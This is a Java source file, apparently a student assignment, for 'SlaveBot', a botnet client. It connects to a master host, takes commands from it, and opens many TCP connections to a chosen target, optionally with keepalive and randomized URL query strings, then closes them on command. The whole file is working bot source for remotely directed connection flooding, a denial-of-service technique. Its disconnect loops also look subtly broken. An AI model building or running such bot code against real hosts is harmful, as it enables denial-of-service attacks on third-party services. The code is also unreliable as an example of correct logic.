/*Created by Mengtong Ma ID: 011483056 */

import java.io.*;
import java.net.*;
import java.util.*;

public class SlaveBot{
	public static void main(String args[]) throws IOException{

		if(args.length == 4 &&
			args[0].equals("-h") &&
			args[2].equals("-p") && 
			Integer.parseInt(args[3]) > 0 && Integer.parseInt(args[3]) < 65536){

			String masterIPOrHostName = args[1];
			int masterPort = Integer.parseInt(args[3]);
			Socket socket = new Socket(masterIPOrHostName, masterPort);
			System.out.println("Connected!!");
			BufferedReader bfrFromMaster = new BufferedReader(new InputStreamReader(socket.getInputStream()));

			while(true){
				String cmdFromMaster = bfrFromMaster.readLine();
				SlaveThread salveThread = new SlaveThread(cmdFromMaster);
				salveThread.start();
			}
		}
		else{

			System.out.println("Usage: SlaveBot -h IPAddress|Hostname -p PortNumber");
		}
	}
}

class connectedSlaveList {
    public static List<Socket> socketList = Collections.synchronizedList(new LinkedList<>());
    public static List<String> ipOrHostList = Collections.synchronizedList(new LinkedList<>());
    public static List<Integer> portList = Collections.synchronizedList(new LinkedList<>());
    connectedSlaveList() {}
}

class SlaveThread extends Thread{

	private String cmdFromMaster;
	private String[] command;
	private String targetIPorHost;
	private int targetPort;
	private int numConnection;

	SlaveThread(String cmdFromMaster){
		this.cmdFromMaster = cmdFromMaster;
	}

	public void run(){
		command = cmdFromMaster.split(" ");

		if(command[0].equals("connect")){
			
			targetIPorHost = command[1];
			targetPort = Integer.parseInt(command[2]);
			numConnection = Integer.parseInt(command[3]);
			for(int i = 0; i < numConnection; i++){
				synchronized(connectedSlaveList.socketList){
					try{
						Socket socket = new Socket(targetIPorHost, targetPort);
						connectedSlaveList.socketList.add(socket);
						// connectedSlaveList.ipOrHostList.add(targetIPorHost);
						// connectedSlaveList.portList.add(targetPort);
						System.out.println("Connected to target: " + targetIPorHost + ", target port number: " + targetPort);
						if(cmdFromMaster.contains("keepalive")){
							socket.setKeepAlive(true);
							if(socket.getKeepAlive() == true){
							System.out.println("Set KeepAlive Successfully!!");
							}
						}
						else if(cmdFromMaster.contains("url=")){
							// generate random string
							StringBuilder strbuilder = new StringBuilder();
							int numOfStr = (int)( Math.floor(Math.random() * 10 + 1) );
							for(int j = 0; j < numOfStr; j++){
								int randomChar = (int)(Math.floor(Math.random() * 23 + 1));
								char c = (char) ((int)'a' + randomChar);
								strbuilder.append(c);
							}
							String randomString = strbuilder.toString();
							// String actualURL = command[4].substring(4);
							
							// PrintWriter pw = new PrintWriter(socket.getOutputStream());
				   //       	BufferedReader br=new BufferedReader(new InputStreamReader(socket.getInputStream()));

							String urlString = "";
							if(targetIPorHost.startsWith("http://") && cmdFromMaster.contains("/#q=")){
								urlString = targetIPorHost + "/" + command[4].substring(4) + randomString;
							}
							else if(cmdFromMaster.contains("/#q=")){
								urlString = "http://" + targetIPorHost + command[4].substring(4) + randomString;
							}
							else if(command[4].substring(4).startsWith("/")){
								urlString = "http://" + targetIPorHost + command[4].substring(4) + "/#q=" + randomString;
							}
							else if(cmdFromMaster.contains("/") == false){
								urlString = "http://" + targetIPorHost + "/" + command[4].substring(4) + "/#q=" + randomString;
							}
							// String a="GET /"+actualURL+randomString+" HTTP/1.1"+"\r\n"+"Host: "+targetIPorHost+":"+targetPort+"\r\n"+"Connection: keep-alive"+"\r\n\r\n";
				   //          pw.println(a);
				   //          pw.flush();
				   //     //BufferedReader br=new BufferedReader(new InputStreamReader(socket.getInputStream()));
				   //     String strTemp = "";
				       
				  //      System.out.println(urlString);
				  //      while ( ( strTemp=br.readLine())!=null) {
						// 	//System.out.println(strTemp);
						// }
							
							System.out.println(urlString);

						}

					}catch (UnknownHostException e){
						System.err.println("No route to host.");
						System.exit(-1);
					}catch (IOException e){
						e.printStackTrace();
						System.exit(-1);					
					}
				}
				synchronized(connectedSlaveList.ipOrHostList){
					connectedSlaveList.ipOrHostList.add(targetIPorHost);
				}
				synchronized(connectedSlaveList.portList){
					connectedSlaveList.portList.add(targetPort);
				}
			}
		}
		else if(command[0].equals("disconnect")){
			boolean isDisconnected = false;
			targetIPorHost = command[1];
			if(command[2].equals("all")){
				for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
					if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost)){
						isDisconnected = true;
						synchronized(connectedSlaveList.socketList){
							try{
								connectedSlaveList.socketList.get(i).close();
								connectedSlaveList.socketList.remove(i);
								// connectedSlaveList.ipOrHostList.remove(i);
								// connectedSlaveList.portList.remove(i);
								System.out.println("disconnect " + targetIPorHost);
							}catch (IOException e){
								e.printStackTrace();
								System.exit(-1);
							}
						}
						synchronized(connectedSlaveList.ipOrHostList){
							connectedSlaveList.ipOrHostList.remove(i);
						}
						synchronized(connectedSlaveList.portList){
							connectedSlaveList.portList.remove(i);
						}
					}
					i--;
				}
			}
			else{

				targetPort = Integer.parseInt(command[2]);
				for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
					if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost) && 
						connectedSlaveList.portList.get(i).equals(targetPort)){
						isDisconnected = true;
						synchronized(connectedSlaveList.socketList){
							try{
								connectedSlaveList.socketList.get(i).close();
								connectedSlaveList.socketList.remove(i);
								// connectedSlaveList.ipOrHostList.remove(i);
								// connectedSlaveList.portList.remove(i);
								System.out.println("disconnect " + targetIPorHost + " at port number: " + Integer.toString(targetPort));
							}catch (IOException e){
								e.printStackTrace();
								System.exit(-1);
							}
						}
						synchronized(connectedSlaveList.ipOrHostList){
							connectedSlaveList.ipOrHostList.remove(i);
						}
						synchronized(connectedSlaveList.portList){
							connectedSlaveList.portList.remove(i);
						}
					}
					i--;
					// else{
					// 	System.out.println(targetIPorHost + " at port number " + targetPort + " is already disconnected");
					// }
				}
			}
			if(isDisconnected == false){
				System.out.println(targetIPorHost + " is already disconnected!");
			}

		}

	}
}




